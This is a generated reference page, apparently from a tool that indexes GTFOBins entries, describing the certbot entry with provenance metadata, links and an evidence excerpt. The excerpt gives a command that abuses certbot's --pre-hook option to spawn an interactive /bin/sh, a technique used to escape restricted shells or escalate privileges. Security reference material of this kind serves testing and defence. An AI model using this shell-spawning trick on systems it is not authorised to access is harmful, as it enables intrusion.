---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# certbot

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `certbot` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/certbot` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for certbot covering shell.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/certbot.md)
- Source verification: [source record](../../sources/gtfobins/certbot.md)

## Aliases

- `certbot`

## Source Verification

[source record](../../sources/gtfobins/certbot.md)

## Evidence Excerpt

```text
_body: ''
_name: certbot
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/certbot
functions:
shell:
- code: certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir . --work-dir . --config-dir . --pre-hook
'/bin/sh 1>&0 2>&0'
comment: This needs a writable directory, replace `.` if needed.
```
